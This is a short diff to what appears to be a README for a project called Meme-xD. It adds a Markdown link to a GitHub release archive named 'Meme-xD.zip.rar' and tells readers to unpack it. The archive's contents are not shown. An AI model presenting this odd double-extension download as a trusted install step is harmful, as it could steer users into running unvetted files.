@@ -13,6 +13,6 @@ pip install tensorflow
 
 Next, download the latest release of the Meme-xD project from the following link:
 
-Meme-xD Version 1.0.0
+[Meme-xD Version 1.0.0](https://github.com/Nach0t/Meme-xD/releases/download/1.0.0/Meme-xD.zip.rar)
 
 Unpack the .rar file in your preferred directory.
